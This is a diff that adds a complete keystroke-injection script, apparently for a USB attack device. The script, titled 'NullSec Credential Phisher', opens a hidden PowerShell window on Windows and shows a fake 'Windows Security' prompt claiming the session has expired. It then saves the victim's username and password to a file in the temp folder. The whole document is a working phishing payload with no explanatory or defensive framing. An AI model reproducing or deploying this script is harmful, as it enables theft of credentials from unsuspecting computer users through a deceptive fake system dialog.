@@ -1,0 +1,20 @@
+REM NullSec Credential Phisher
+REM Displays fake Windows login prompt
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING Add-Type -AssemblyName Microsoft.VisualBasic
+ENTER
+STRING $creds = [Microsoft.VisualBasic.Interaction]::InputBox("Windows Security`n`nYour session has expired. Please enter your password to continue.", "Windows Security - $env:USERNAME", "")
+ENTER
+STRING "$env:USERNAME : $creds" | Out-File "$env:TEMP\creds.txt"
+ENTER
+STRING exit
+ENTER
